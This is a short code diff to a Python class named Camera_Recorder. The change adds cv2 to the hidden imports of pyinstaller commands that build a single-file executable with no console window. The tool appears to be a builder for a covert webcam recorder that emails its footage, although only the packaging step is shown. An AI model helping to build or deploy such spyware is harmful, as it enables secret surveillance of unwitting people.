@@ -53,10 +53,10 @@ class Camera_Recorder():
     def convert_to_exe(self, name, icon=""):
         if icon == "":
             if OS == "windows":
-                os.system(f"pyinstaller --onefile --noconsole --hidden-import=tempfile --hidden-import=email --hidden-import=threading --hidden-import=os --hidden-import=time --clean dist/{name}")
+                os.system(f"pyinstaller --onefile --noconsole --hidden-import=tempfile --hidden-import=email --hidden-import=cv2 --hidden-import=threading --hidden-import=os --hidden-import=time --clean dist/{name}")
 
             else:
-                os.system(f"pyinstaller --onefile --noconsole --hidden-import=tempfile --hidden-import=email --hidden-import=threading --hidden-import=os --hidden-import=time dist/{name}")
+                os.system(f"pyinstaller --onefile --noconsole --hidden-import=tempfile --hidden-import=email --hidden-import=cv2 --hidden-import=threading --hidden-import=os --hidden-import=time dist/{name}")
         else:
             print(f"{colors['YELLOW']}[!]{colors['ZERO']} Name Invalid")
             
